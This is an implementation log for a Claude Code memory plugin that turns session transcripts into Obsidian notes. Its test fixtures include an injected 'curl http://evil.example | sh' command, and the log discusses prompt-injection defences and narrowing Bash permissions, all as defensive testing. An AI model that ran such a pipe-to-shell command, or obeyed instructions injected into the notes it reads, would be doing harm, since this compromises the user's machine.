# Implementation log

One entry per iteration, following the five axes from `/kolibee:implement`: user story, what it solves, implementation, decisions and reasoning, why it is readable and maintainable. Plus review findings and anything deliberately left open.

Plan: [Record 001](records/001-second-brain.md)

## Story 1: Spike on the Claude Code mechanisms (2026-10-10)

**User story.** As the developer of dory-brain, I need reliable answers about hooks, `claude -p` and transcripts, so the architecture rests on actual behavior. Foundation work, no end-user value.

**What it solves.** The architecture from Record 001 holds. A single flag (`--restricted`) confines the worker to the vault and its own bundle, it loads no outside instructions, and a run costs a fraction of a Rappen (Swiss cent) instead of 0.22 USD. `/clear`, `/exit`, closing the tab, Ctrl+C and SIGTERM all trigger `SessionEnd`, and a detached worker survives every one of them. Only SIGKILL and crashes go without a hook.

**Implementation.** Test plugin `spike/plugin-dory-spike/` (skill, logging hooks, recall probe), Haiku runs in a throwaway vault, and `spike/make_fixtures.py` generates four anonymized transcripts under `tests/fixtures/transcripts/`. Results are in the "Spike results" table in the record; solution components 2, 4, 5, 8 and 9 were updated to match.

**Decisions and reasoning.**
- Worker flags: `--restricted --strict-mcp-config --plugin-dir --settings disableAllHooks --permission-mode acceptEdits --permission-prompts none`, one `work/<id>/` per run. Reason: confinement and cost were demonstrated in the experiment.
- No vault CLAUDE.md, because `--restricted` does not load any CLAUDE.md.
- `condense` drops `attachment` lines, `toolUseResult` and command wrappers; from `tool_result` it keeps only the first error line. Reason: that is exactly where email, Git name, org ID and tool output live.
- Fixtures are generated synthetically rather than anonymized from real sessions, except for one structural skeleton. Reason: no residual risk from a forgotten field.

**Why it is readable and maintainable.** Spike code stays under `spike/`, separate from the later plugin; the fixture script documents both modes and is repeatable.

**Review findings (3 agents, all `correct`, no P0/P1).**
- P2 Organization ID not replaced in two fixtures: fixed, fixtures regenerated.
- P2 Skeleton lost command wrappers: fixed, all wrappers are kept.
- P2 Story 4 criterion required an output that had been dropped: switched to `sessions/<id>.json`.
- P2 Worker depended on `CLAUDE_PLUGIN_ROOT`: the plugin path is now derived from the script location.
- P3 Git name, hook log path, `toolUseResult`, contradiction about error lines, cleanup of `sessions/`, recall on `resume`, `~/.ssh` evidence, `--add-dir` writable: all fixed or verified.

**Deliberately left open.** A sweeper for sessions without `SessionEnd` (SIGKILL, crash) stays in Future.

**Addendum.** At the user's request, no manual tests: closing the tab and Ctrl+C were checked automatically in a pseudo-terminal with `spike/interactive_exit_test.py`. One test run with a prompt in the repo triggered the global session start workflow; runs without a prompt avoid that, and nothing in the repo was changed.

**Second review round (2026-10-11, 2 agents, both `correct`, no P0/P1), all findings addressed.**
- P2 Spike table still showed `--plugin-dir "$CLAUDE_PLUGIN_ROOT"` (reported twice): aligned with component 4.
- P2 Fixtures were below `min_user_messages`, so a condense test would have passed without the filter: regenerated `tool-output-secrets.jsonl` with 3 user messages and a secret in the user text; Next task mentions `min_user_messages = 1` for `tool-error.jsonl`.
- P3 Cleanup of `sessions/` after 30 days was not assigned to any component: `dory recall` takes it over, Story 4 criterion extended.
- P3 Docstring of `interactive_exit_test.py` described old behavior: updated.
- P3 Exit status was lost in the Ctrl+C path: now printed.

## Story 2: Session end lands safely in the queue (2026-10-11)

**User story.** As a user, I want every finished session to be queued and condensed without any wait, so nothing gets lost and the LLM run only sees cleaned-up material. Foundation for Story 3; no visible benefit in the vault yet.

**What it solves.** When you end a session, a queue entry plus a copy of the transcript is under `~/.local/state/dory-brain/` in less than a second. `dory worker --dry-run` builds an input bundle from it: project (from Git), CLAUDE.md excerpt, record titles and the condensed conversation. Tool output, context lines with email and org ID, Bash mode output and agent reports are left out; secrets in user and Claude text are redacted. Not yet: processing with `claude -p` (Story 3).

**Implementation.** Plugin under `plugin/` (manifest, `hooks/hooks.json` with SessionEnd, `bin/dory` as a uv script), package `plugin/dory/`: `config` (TOML + environment), `state` (directory layout, seen uuids), `queue` (entry, APFS clone, repo main path at enqueue time), `condense`, `secrets`, `project` (Git main path, names in `projects.json`), `bundle`, `worker` (flock, pass with recheck, outcomes done/skipped/transient/failed), `cli`. 46 tests under `tests/`.

**Decisions and reasoning.**
- Standard library only; `tomllib` instead of pyyaml. Reason: the hook starts without dependencies.
- `Process` callback in the worker: Story 3 plugs in the `claude -p` call without touching the lock or the outcomes.
- The repo main path is determined in the hook, not in the worker. Reason: herdr worktrees are often gone by processing time.
- An empty delta (nothing new since `save`) produces no bundle.
- `worker` without `--dry-run` refuses with exit 2 until Story 3.
- Hook errors go to `hook-errors.log`, and the hook always exits with 0.

**Why it is readable and maintainable.** One module per responsibility, dependencies in one direction only (`cli` → `worker` → `queue`/`condense`/`bundle` → `project`/`secrets`/`state`). The test names read like a specification.

**Residual risk for Story 5.** Claude's reply text may go into the bundle and can quote injected instructions (in the fixture, Claude mentions the `curl` URL while warning against it). `dory:rules` has to catch this: commands only go into notes if the user ran or confirmed them personally.

**Review findings (2 agents; architect `correct`, code `incorrect` because of two P1s), all fixed.**
- P1 Bash mode output (`<bash-stdout>`) and agent reports (`<task-notification>`) were treated as user text and counted toward the minimum length: filtered, test added. Cross-check against 180 real transcripts: only `<pasted_content>` remains, and that is pasted user text.
- P1 Secret filter missed quoted JSON keys, `Bearer` tokens, Stripe and GitLab tokens: patterns added, tests added.
- P2 Empty delta wrote an empty bundle (both agents): no bundle anymore.
- P2 Project was lost if the worktree was deleted before processing: repo path recorded at enqueue time.
- P2 Hook could end with a traceback: caught, logged, always exit 0.
- P2 An unreadable queue entry blocked the queue: moves to `failed/`.
- P2 A single oversized message blew the budget (both agents): every entry is capped.
- P3 `DORY_WORKER` stopped every command: now only applies to `enqueue`.
- P3 Submodules were treated as "no project": own project via `--show-toplevel`.
- P3 Redaction of `sk-ant-` and private keys was only tested indirectly: dedicated end-to-end test.

## Story 3: Session note in the vault (2026-10-11)

**User story.** As a user, I want a finished session to produce a session note in the Obsidian vault, so I can see what happened in which project. First visible benefit.

**What it solves.** `dory worker` now processes the queue with `claude -p`. Trial run with Haiku against a throwaway vault: 17 to 19 seconds, 0.0045 USD; it produces a session note (`sessions/2026/10/2026-10-11-1331-dory-brain-probe-00-1.md`, frontmatter per schema, Log and Open written in German) and the project overview `projects/dory-brain/dory-brain.md` with a link to the session. The token, API key and `curl` URL from the fixture appear nowhere in the vault; nothing was written outside the vault and state. Not yet: knowledge notes (Story 5), loading at startup (Story 4). The hook is not installed in Claude Code yet.

**Implementation.** `plugin/dory/ingest.py`: bundle, fixed note path, `task.md` with fixed frontmatter values and `rules.md` (a copy of `dory:rules`, because the confined run may not read the plugin directory) into the bundle directory, vault snapshot, call through a swappable runner with a timeout, parsing of the JSON output, success only if the note exists, then uuids marked as seen, a line in `runs.log`. Skills `plugin/skills/rules` (minimal version) and `plugin/skills/ingest`. 66 tests.

**Decisions and reasoning.**
- Failure modes of `claude -p` confirmed with real runs (401, 404, budget, success; fixtures under `tests/fixtures/claude-output/`). 429 could not be triggered; that fixture is built from the 401 shape and named as synthetic.
- 401/403 count as transient (expired login), 404 and budget as failures.
- Without a network, `claude -p` hangs in retries. A timeout therefore counts as a failure and ends the pass; otherwise every waiting entry would hang for 10 minutes. Criterion 3 has a documented limit for this.
- The session note is written last and marks success. An existing note for an entry that is not done is a draft and gets rewritten.
- Date (local time), part number and project are computed by Python, not by the model.

**Why it is readable and maintainable.** `ingest` plugs into the Story 2 worker as a callback, without touching the lock or the queue. The runner is swappable; the tests replace `claude -p` with a fake that writes the note as requested.

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 Part number depended on the contents of `done/`, so a retry could create a second note (both agents): derived from all older entries of the session.
- P2 A partial snapshot blocked the `copytree` fallback: deleted beforehand.
- P2 A note from an aborted run stayed frozen, and content after resume was lost: rewritten as a draft.
- P2 An offline pass charged every entry a 10 minute timeout: the timeout ends the pass.
- P3 Snapshots before runs that fail immediately on the rate limit pushed out real history: deleted again.
- P3 The model computed local time itself: fixed values in `task.md`.
- P3 Session note written before the overview: now written last (fits the insight links in Story 5).
- P3 Crashes before the run were missing from `runs.log`: now logged.
- P3 Timeout only tested with a fake: real test with a hanging `sleep`.
- P3 Return types added.

## Story 4: Short-term recall at startup (2026-10-11)

**User story.** As a user, I want a new session in a repo to automatically know the recent sessions of that project, so after `/clear` or a break I don't have to explain where we are. Core value.

**What it solves.** The SessionStart hook `dory recall` injects: the project with its summary and "Open" from the project overview, the last 3 sessions of the project with their age ("today", "yesterday", "3 days ago") and a wikilink, and sessions still waiting in the queue with the path to the transcript copy. Outside a repo, the last sessions without a project. On `resume`, nothing. Confirmed end to end: a real `claude -p` session with the plugin answered "What do you know about the last session?" from the probe vault, and its SessionEnd queued it again. Not yet: knowledge notes, catalog, domain boundary (Story 6).

**Implementation.** `plugin/dory/frontmatter.py` (parser for the fixed schema), `plugin/dory/recall.py` (scan, three tiers, budget), `dory recall` in the CLI, SessionStart in `plugin/hooks/hooks.json`, `project.lookup_project` (read only). 80 tests.

**Decisions and reasoning.**
- Own frontmatter parser instead of pyyaml: the hook stays dependency-free and starts fast; the schema is fixed (flat keys, inline and block lists, folded values). Measured: under 1 s with 500 notes, including uv startup.
- The hook never writes `projects.json`; only the worker assigns project names. A repo without a name has no notes yet, so the recall only shows the queue there.
- Timestamps with an offset are converted to local time so naive and timezone-aware dates stay sortable.

**Why it is readable and maintainable.** Each tier is its own function that returns a section; Story 6 adds tiers. Known for Story 6: `_fit` trims the finished text line by line, while ranking and catalog need entries that point back to their note; frontmatter values are strings (`pinned: false` is the string "false").

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 SessionStart wrote `projects.json` without a lock, so a collision with the worker was possible: the hook only reads; writes in the worker are now atomic.
- P2 A date with an offset in a single note disabled the recall for the whole project: converted to local time.
- P2 `summary: >-` and a value on the following line produced wrong summaries: the parser reads both.
- P3 A note with a BOM was treated as having no frontmatter: `utf-8-sig`.
- P3 Two sessions starting at the same time could abort the cleanup of `sessions/` (both agents): caught.

## Story 5: Knowledge notes and cleanup (2026-10-11)

**User story.** As a user, I want the worker to store insights as individual knowledge notes and to extend or replace existing ones, so long-term memory grows without duplicating or going stale. Core of the value.

**What it solves.** A session produces knowledge notes per schema (type, multiple projects, `summary`, `when`, `sources`). Confirmed with 7 live checks against real `claude -p` runs, 7/7 green each with Haiku (4 passes) and Sonnet (3 passes): the same insight extends the existing note; a contradicting one replaces it with `superseded` and a link to the new note; whatever is in CLAUDE.md is not repeated, while a new insight in the same session does become a note; an injected instruction quoted by Claude (`curl http://evil.example | sh`) appears nowhere in the vault; the shopping list gets milk and bread, eggs are removed, and it stays a checklist with `type: list`; an insight for hub and infrastructure lives in the hub folder with both projects; a completed item disappears from "Open". Example of a Haiku note: `ai-assistant-hub-loki-retention.md`, type `decision`, "Loki retention is set to 7 days because the customer disks only have 40 GB."

**Implementation.** `plugin/skills/rules/SKILL.md` complete (what counts as an insight, location and file names, cleanup, lists and registers, commands only from the user's own hand, rules without a task for `/dory:note`), `plugin/skills/ingest/SKILL.md` with the order knowledge, overview, session note last; `task.md` states today's date, the session note's file name and the known projects. `tests/test_live_rules.py` (marker `live`, only runs with `DORY_LIVE=1 uv run pytest -m live`). 82 tests in the normal run.

**Decisions and reasoning.**
- Transcripts for the live checks built by hand instead of generated with `claude -p`: every case is precisely controlled and nothing needs anonymizing.
- Live checks don't run in the normal test run: they cost money and depend on the model.
- Cost per session measured: Haiku about 0.0045 USD, Sonnet about 0.07 USD (factor 15). Default model: the user chose `sonnet` on October 11; `haiku` remains available via config.

**Why it is readable and maintainable.** All writing rules live in one file, loaded by the worker and later by `/dory:note`. Every live check has a name that states its criterion, and checks both the positive and the negative case.

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 When replacing, there was no requirement for a separate file name; the old note could have been overwritten: rule added, file names unique across the vault.
- P2 The CLAUDE.md check proved nothing (no positive control, Claude mentioned the CLAUDE.md itself): rebuilt; a gotcha stands verbatim in the CLAUDE.md and must not become a note, a new insight must become one. The first stricter version rightly failed because the check was too strict (the swap note mentioned the deploy script as context) and was refined.
- P2 Open check too strict (missing section): tolerated.
- P2 A broken `projects.json` also made sessions without a project fail: falls back to an empty list.
- P3 "cross-project" distinguished from "multiple projects"; `summary` rule for the session note restored; `superseded_by` checked to point at the new note; list checked as a checklist with `type: list`; rules for `/dory:note` without a task; docstring with `DORY_LIVE=1`; unit tests for the new values in `task.md`.

## Story 6: Full recall (2026-10-11)

**User story.** As a user, I want startup to also load the relevant long-term knowledge and a catalog, without private material in work sessions, so I can use relevant knowledge even when it comes from another project.

**What it solves.** A session in `ai-assistant-hub-infrastructure` now gets, under "Project knowledge", the note "Loki container only starts if the data directory is owned by UID 10001. (When: deploying or debugging Loki on a customer VM)" with its path, even though the note lives in the hub folder; plus, under "Cross-project knowledge", notes from `general/` in the same domain. A catalog lists lists and registers and the project notes that did not fit the budget, with path and a pointer to `/dory:search`. Order: pinned, number of `sources`, `updated`; superseded never. In a `work` project nothing with `domain: private` appears, not even in the catalog; outside a repo both domains, so in `~` the shopping list and invoices. Real hook call against a probe vault with 502 notes: 0.1 s.

**Implementation.** `plugin/dory/recall.py`: sections consist of entries (`_Section`), and the budget (`_Budget`) is charged per entry instead of trimming the finished text line by line, so the recall knows which note was loaded. `Note` knows `type`, `domain`, `is_knowledge`, `updated` (date) and `rank`. New tests in `tests/test_recall_knowledge.py` (the 4 criteria plus private projects, other projects, catalog with a full budget, no empty headings); the 500-note test now mixes in knowledge notes, superseded notes and lists. 90 tests.

**Decisions and reasoning.**
- Cross-project means `projects: []` (like `general/`). Notes from other projects are not loaded.
- "Matching domain" for tier 5 is the project's domain from the overview (default `work`); in a `private` project there is no boundary for project notes and catalog.
- Strict ranking: if a knowledge note doesn't fit, no lower-ranked note is loaded either, not even from tier 5.
- 20 % of the budget stays reserved for the catalog while knowledge is loaded. Without the reserve the catalog vanished entirely when there were many notes, and the notes that weren't loaded showed up nowhere. If all the knowledge fits, the reserve costs nothing. The number is set, not measured.
- Lists and registers come before the unloaded notes in the catalog: the catalog is their only way into the session.
- Lists and registers without a `domain` count as private (default from `dory:rules`).

**Why it is readable and maintainable.** Each tier returns a `_Section`; `_fill_section` is the only place that deals with budget and headings. The module docstring describes all six tiers, the ranking and the boundary.

**Found during the real run (before the review).** Empty sections showed up as a bare heading; the catalog disappeared when the budget was full because all project notes counted as loaded; the gap between sections was counted as one character instead of two (output 1 character over budget). All three fixed and covered by tests.

**Review findings (2 agents, both `correct`, no P0/P1), addressed.**
- P2 Lists and registers came after the unloaded notes in the catalog and got dropped in large projects (code-reviewer): order reversed, test with a register in an overflowing project, cross-check fails with the old order.
- architect-review: no findings.

## Story 7: Making operations visible (2026-10-11)

**User story.** As a user, I want to see whether the worker is running, what fails and what it costs, so a silent failure gets noticed.

**What it solves.** `dory status` shows the queue length, the number of failed entries with the reason per entry (for example "session note missing: sessions/2026/10/…"), the last error with time and kind, and the cost today and this week (week starting Monday, local time), and on failures a pointer to `dory retry`. `dory retry` moves failed entries back into the queue with the counter reset to 0 and starts the worker. The worker has been writing `runs.log` since Story 3 (entry, result, seconds, cost, error); the handover in the loop state had wrongly listed that as open.

**Implementation.** New module `plugin/dory/ops.py` (`status`, `retry`), commands `status` and `retry` in `plugin/dory/cli.py`, `worker.lock` made public (previously `_lock`). Tests in `tests/test_ops.py`; the `runs.log` test in `tests/test_ingest.py` now checks all four fields. 97 tests.

**Decisions and reasoning.**
- "Last error" comes from `runs.log` (with time), the reason per parked entry from its `last_error`. Skipped runs don't count as errors, even though `ingest` records a reason.
- Broken lines in `runs.log` are skipped so a truncated line doesn't hide the costs.
- Unreadable entries in `failed/` stay there; `retry` only reports what it moved.
- `retry` takes the worker lock. If a worker is running, it moves nothing and says so (exit 1): the running pass has already tried the entries and would skip them.

**Why it is readable and maintainable.** `ops.py` only reads files that the queue and worker write anyway; no new format. Status text in the same language as the recall.

**Review findings (2 agents, both `correct`, no P0/P1), addressed.**
- P2 Skipped runs ("nothing new to condense") showed up as "Last error" and hid real errors (both agents): filtered, test with a skipped run, cross-check fails without the fix.
- P3 A retry while a worker was running sat there until the next session end (both agents): `retry` takes the lock and reports a running worker; test. Rejected: renaming the file on retry, because the session note's part number is sorted by file name.

## Story 8: `/dory:save` (2026-10-11)

**User story.** As a user, I want to save a running session right now, so important insights are secured before I keep working.

**What it solves.** `/dory:save` queues exactly the running session and replies "Session f1d13db4 queued; the worker processes it in the background." Work continues without any wait. When the session ends later, the worker only processes what came after the save, as part 2 of the session note. Confirmed with real `claude -p` runs (Haiku, throwaway state, no worker, under 0.01 USD in total): a session on its own got its `save` entry without a permission prompt; of two concurrent sessions in the same repo, only the one that saved got one.

**Implementation.** `dory enqueue --session <id>` in `plugin/dory/cli.py` reads `sessions/<id>.json` (from the SessionStart hook), enqueues with `reason: save` and starts the worker detached. Skill `plugin/skills/save/SKILL.md` (`disable-model-invocation`, `allowed-tools: Bash`). Transcript copy now per entry (`queue.py`), skipped entries as `<id>.skipped.json` (`worker.py`); state tree in Record 001 updated. 104 tests.

**Decisions and reasoning.**
- The skill calls the CLI through the Bash tool; Claude Code fills in the session ID in the skill text. `disable-model-invocation`, so Claude doesn't save on its own.
- `--restricted` disables the Bash tool (seen in the live run). Irrelevant for `/dory:save`, because normal sessions don't run restricted; the live check therefore uses `--setting-sources project` so no hooks from other plugins run along.
- Unknown or empty session ID: message "Session … not found; is the dory plugin active?" and exit 1, so the skill shows the error.

**Why it is readable and maintainable.** `_save` sits next to `_enqueue_from_hook`; both use `queue.enqueue` and `spawn_worker`. Part numbers and `seen_uuids` from Story 3 cover criterion 2 without new mechanics.

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 One transcript copy per session: if the `save` entry hadn't been processed by session end, the end overwrote the copy and everything ended up in part 1 (both agents): copy per entry; test with `save` and end in one pass.
- P3 Skipped entries counted toward the part number, so a second `save` with nothing new left a gap (architect): `.skipped.json` suffix, test.
- P3 An empty `--session` silently fell into hook mode (code-reviewer): check for `None`, test.

## Story 9: `/dory:note` (2026-10-11)

**User story.** As a user, I want to store a note directly with `/dory:note "..."`, so I can record something without processing a session.

**What it solves.** `/dory:note "Loki port 3100 collides with Grafana"` in the hub repo creates `projects/ai-assistant-hub/ai-assistant-hub-loki-port-3100.md` (type `gotcha`, `projects: [[ai-assistant-hub]]`, `summary`, `when`, `sources: []`) and adds it to the project overview under `## Knowledge`; where the text doesn't say, the note states "Cause and resolution are not recorded". If a note on the topic already exists, it gets extended. `/dory:note "Buy milk"` in `~` extends the shopping list. In a repo the worker has never seen, the note lands in that project and the overview is created. A snapshot is taken before writing; there are no follow-up questions.

**Implementation.** `dory prepare-note` (`plugin/dory/note.py`): snapshot, then vault, date, project with domain and overview (or "missing"), known projects and the writing rules as text. Skill `plugin/skills/note/SKILL.md` (`disable-model-invocation`, `allowed-tools: Bash, Read, Write, Edit, Glob, Grep`). Snapshot and rule text in `plugin/dory/vault.py`, shared by worker and note. Tests `tests/test_note.py`; live checks `tests/test_live_note.py` (marker `live`): 4 cases, green several times with Haiku, under 0.01 USD per run. 109 tests in the normal run.

**Decisions and reasoning.**
- The rules come along in the output of `prepare-note` instead of the skill reading the rules file: one tool call fewer, nothing to read outside the vault.
- Writing without a prompt via `allowed-tools` in the skill, without an entry in `~/.claude/settings.json` (checked live, `permission_denials` empty, even though the vault is outside the working directory). So `additionalDirectories` from the spec isn't needed.
- `prepare-note` assigns a project name to a new repo the same way the worker does (`detect_project`), so a note from a new repo doesn't end up under `general/`.
- Live checks with Haiku: in daily use the skill runs with the session's model, and Haiku is the stricter test.

**Why it is readable and maintainable.** The writing rules still exist exactly once (`dory:rules`); worker and note fetch them via `vault.rules_text`.

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 In a repo without a vault folder, the project was missing from "Known projects", and the skill forbade creating the missing overview; the note would have landed under `general/` (code-reviewer): the session's project counts as known, the overview is marked as "missing", and the skill may create it; unit test and live check.
- P3 `note` depended on the worker module `ingest` (architect): `snapshot` and `rules_text` moved to `vault.py`.
- P3 A comment after `detect_project` made the formatter wrap the call (code-reviewer): comment moved above it.

## Story 10: `/dory:search` (2026-10-11)

**User story.** As a user, I want to pull in specific knowledge with `/dory:search "..."`, so I can get at information that startup didn't load.

**What it solves.** `/dory:search loki deploy` in the hub repo returns as its first hit "Loki only starts if the volume is owned by UID 10001. (When: deploying Loki) → projects/ai-assistant-hub/ai-assistant-hub-loki-uid-10001.md". It searches summary, when, tags, file name and body; a search term also matches as part of a word ("deploy" finds "deploying"). In a `work` project no private notes appear; outside a repo they do. No hits: "No matches for "…" in the vault …". Replaced notes are not offered.

**Implementation.** `plugin/dory/search.py`, CLI `dory search <words>`, skill `plugin/skills/search/SKILL.md`. Scan, project domain and domain boundary reused from `recall.py` (made public: `scan`, `project_domain`, `allowed`; new `Note.superseded`). Tests `tests/test_search.py`; two live checks in `tests/test_live_note.py`. 116 tests in the normal run, live 6/6 with Haiku.

**Decisions and reasoning.**
- Scoring: per search term the best field counts (summary and when 3, tags and file name 2, body 1); sorted first by number of matched terms, then by weight; at most 10 hits. No index: a single pass over the vault is enough for hundreds of notes.
- All note kinds are searched except replaced ones (knowledge, sessions, overviews, lists); replaced notes lead to their successor.
- The model may start `/dory:search` without an explicit invocation, because search only reads. To make that safe, the Bash permission is limited to exactly `${CLAUDE_PLUGIN_ROOT}/bin/dory search`; Claude Code substitutes the variable in `allowed-tools` too. A leading wildcard (`*/bin/dory search:*`) does not match.
- Search only reads the project (`lookup_project`) and assigns no names.

**Why it is readable and maintainable.** The domain boundary and the definition of "replaced" each exist once (`recall.allowed`, `Note.superseded`) and apply the same way to startup and search.

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 The model-startable skill allowed every Bash command; a command from a note it had read would have run without a prompt (both agents): permission limited to `dory search`. Live cross-check: with the old permission, `touch dory-probe` ran without a prompt and the file was created; with the new one it was denied; recorded as a live check.
- P3 A note deleted between scan and read aborted the search (code-reviewer): a read error yields empty text; test.
- P3 "Replaced" was defined twice, in search and recall (both agents): `Note.superseded`.

**Open, not part of this story.** `/dory:save` and `/dory:note` still allow `Bash` without restriction. They only start on explicit invocation (`disable-model-invocation`), but `/dory:note` reads vault content; the same restriction can be applied there.

## Quality pass before 0.1.0 (2026-10-11 to 2026-10-12)

**What it solves.** Before the plugin was switched on for real sessions, the worker processed 10 real sessions from five areas (two repos with worktrees, a personal app, `~`, a folder without git) with `sonnet` into a throwaway vault. All 10 ran without error, 18 to 61 seconds each, 0.16 to 0.36 USD API equivalent. 12 of 12 sampled facts (numbers, VM sizes, tags, error messages) were found in the transcript or bundle; no secrets reached the vault.

**Findings and fixes.**
- The project overview's open items grew to 15 after five sessions and took a third of the start budget. The recall now shows at most 7 open items plus a pointer to the overview; the rules cap the list at 10 and drop what is done or outdated.
- A rule the user had set for one app ("documentation may go straight to main") landed in `general/` and would have been loaded in every work session. The rules now keep project rules out of `general/`. The first version of that rule overcorrected (almost nothing went to `general/` any more); the final rule separates a project's own stack, which stays in the project, from tools, accounts and devices, which go to `general/`.
- A note about the user's own NAS was marked `work`. `domain` now follows the content, with home infrastructure counted as private.
- Live checks found that tests read the user's real config (`language = "German"` turned "milk" into "Milch"); `tests/conftest.py` now points `DORY_CONFIG` at a throwaway file for every test. Haiku sometimes left `projects: []` on a note inside a project folder; the rules now say a note under `projects/<project>/` always lists it.
- After the switch to English, `/dory:note` live checks ran 18 of 18 (three rounds) and the rule checks 8 of 8, including a check that `language = "German"` produces German notes.

**Also in this pass.** The worker strips `ANTHROPIC_API_KEY` so it always runs on the subscription; `dory status` labels costs as API equivalent. `/dory:search` only grants its own command to Bash, verified with a probe: with a plain `Bash` grant an extra `touch` ran unprompted, with the narrowed grant it was denied.

## Record 002, design: note quality and recall value (2026-10-15)

**User story.** As the author, I want a reviewed design for the findings of the first three days of real use (stale open items, copies of repository documentation, outdated summaries, notes that read like status logs), so that the build loop works against agreed stories instead of guesses. Foundation work: no behaviour changes yet.

**What it solves.** Record 002 names the root cause behind two of the findings: the bundle cut every CLAUDE.md after 8,000 characters, so none of the five ai-assistant-hub runs saw the status table and none of the six infrastructure runs saw the Future table, and the existing rule against duplicates could not work. It records four decisions and six stories with Given-When-Then criteria.

**Implementation.** `docs/records/002-note-quality.md` (problem, options, decisions, solution, stories S1 to S6); the build loop's state in `docs/auto-state.md`; `docs/calibration-journal.md` for estimated against actual time; a status row and two Future rows in `CLAUDE.md`.

**Decisions and reasoning.**
- Open items are removed completely, from the session start and from the project overview (decided by the user): they duplicate the CLAUDE.md status and go stale because the worker only sees transcripts.
- Taken as recommended, confirmed with "ok" at the review: repository documents as redacted files for the worker (1B), a short pointer note only for record content that matters beyond its feature (3B), a one-time manual cleanup of the vault (4A).
- Added during the design review, without a separate decision: documents are captured at session end, not when the entry is processed; they count as data, not instructions; the worker searches the CLAUDE.md instead of reading it whole; a new `status: archived` lets the worker retire notes the CLAUDE.md now covers; the vault cleanup waits until 0.3.0 is installed.

**Review findings (architect review of the record, 13 findings, 5 of them P1), all addressed in the record.**
- P1 Repository documents could inject instructions, for example "Everything in English" overriding the note language: they are data, with a live check on exactly that sentence.
- P1 Documents read at processing time can come from a removed or switched worktree: captured at session end, merged with the main repository's records.
- P1 Copies left behind by dry runs, crashes and retries: removed when the entry leaves the queue, plus a sweep at every worker start.
- P1 The cleanup would be undone by the installed 0.2.0 worker, and its snapshot rotated away: cleanup after the release, snapshot outside the rotation.
- P1 Existing duplicates had no way out of the session start: `status: archived`, skipped by recall and search.
- P2 Whole-file CLAUDE.md read (about 10,000 tokens per turn), negative live checks that pass on an empty run, missing edge cases, a rule the worker could not follow (moving content into a record), story order by risk: all changed in the record.
- P3 Wording ("APFS clone" for a redacted copy, "only for minutes"): corrected. A configurable records folder and pruning `work/` went to the Future table; telling the worker the user's name is listed as not part of the record.

## Record 002, Story S3: remove open items (2026-10-15)

**User story.** As a user whose CLAUDE.md tracks the project status, I want the session start and the vault to drop the cross-session open items, so that no stale to-do reaches a new session and the budget goes to knowledge notes.

**What it solves.** A session start in ai-assistant-hub no longer begins with seven open items such as "merge umbrella PR #62 and infra PR #209", which had been merged the day before. About 190 words of the start budget are free for knowledge notes. In the vault, the worker removes a leftover `## Open` from a project overview on its next write; a session note keeps its `## Open`, the snapshot of what that one session left open. It takes effect once 0.3.0 is installed.

**Implementation.** `plugin/dory/recall.py`: `_project_section` returns the project line with the overview's summary only; `_MAX_OPEN_ITEMS`, the section parser `_section_bullets` and the `body` import are gone. `plugin/skills/rules/SKILL.md`: the overview template has `## Knowledge` and `## Sessions`, plus the rule to remove a leftover `## Open`. `plugin/skills/ingest/SKILL.md` step 6, README and the CLAUDE.md architecture line follow. Tests: `tests/test_recall.py` (an overview with twelve open items yields none of them), two live checks in `tests/test_live_rules.py` replacing the obsolete "finished item leaves the list".

**Decisions and reasoning.**
- The session note keeps `## Open`: it is dated by its session and never injected, so it cannot go stale in a harmful way.
- Both live checks carry a positive control: the overview check passes only if the worker rewrote the overview (the new knowledge note under `## Knowledge`, the session under `## Sessions`), the session-note check requires the open item to be there.

**Why it is readable and maintainable.** The session start no longer parses any note heading; it reads only frontmatter. `_project_section` is nine lines.

**Proof.** 120 unit tests green, ruff clean. Live with Haiku: the two new checks 3 of 3 rounds, the other seven rule checks once, the language and overview checks once more after the review fix.

**Review findings (2 agents, both `correct`).**
- P3 The rules and the CLAUDE.md gave "the recall reads the headings" as the reason for English headings, which this change made untrue (code-reviewer): both now say the worker finds existing sections by their English names, and the recall reads the frontmatter keys.

**Follow-up decision.** At the review the user asked whether recent sessions still help; a sample of seven concrete facts from session logs found six in the repositories' documents. Decision 5 in Record 002: the session start drops recent sessions as well (Story S4).

## Record 002, Story S4: remove recent sessions from the session start (2026-10-15)

**User story.** As a user who knows what I did yesterday and can look it up, I want the session start to leave out the summaries of recent sessions, so that its budget goes to knowledge I would not know to ask for.

**What it solves.** Simulated against the real vault, a session start in ai-assistant-hub-infrastructure now loads 10 of its 11 knowledge notes instead of 4: the `modelProviderData` pitfall and the budget conversion moved from a bare path in the catalog to summary and occasion. The block of three session summaries (85 to 98 words) and the open items before it (S3) are gone. Sessions still waiting in the queue are still listed with their transcript path.

**Implementation.** `plugin/dory/recall.py`: `_sessions_section`, `_age`, `Note.date` and the `now` parameter of `recall` are gone; the docstring lists the new priorities and says why sessions are left out. `plugin/dory/config.py`: `short_term_sessions` removed; `load_config` already drops unknown keys, so old config files keep loading. README (intro, "When a session starts", advanced settings) and the CLAUDE.md (intro, architecture) follow. Tests: two recall tests now assert that no summary appears, in a project and outside a repository; `tests/test_config.py` loads an old config with the setting; the test for mixed date formats went with the sorting it tested.

**Decisions and reasoning.**
- Decision 5 in Record 002, taken by the user at the review of S3: the session start carries what nobody would think to ask for; recent activity is known and found on demand (`git log`, CLAUDE.md, handover notes, `/dory:search`). A sample of seven concrete facts from session logs found six already in the repositories' documents.
- Session notes stay in the vault: they are the knowledge notes' sources (the ranking counts them), the worker's success marker and what search finds.

**Why it is readable and maintainable.** About 50 lines less in `recall.py`; the session start has three parts left (project line, queue hint, knowledge with catalog), and the docstring keeps the reason so the block is not added back by accident.

**Proof.** 120 unit tests green, ruff clean; the rewritten tests failed before the change. No live checks: worker and rules are unchanged.

**Review findings (2 agents, both `correct`).**
- P3 The README spoke of "the previous session" in the queue, while every waiting session of the project is listed (code-reviewer): the sentence says so now and matches the CLAUDE.md.

## Record 002, Story S1: repository documents for the worker (2026-10-15)

**User story.** As a user whose repository keeps status and decisions in a long CLAUDE.md and in records, I want the worker to see these documents as they were when my session ended, so that the vault holds what the repository does not say, instead of copies of it.

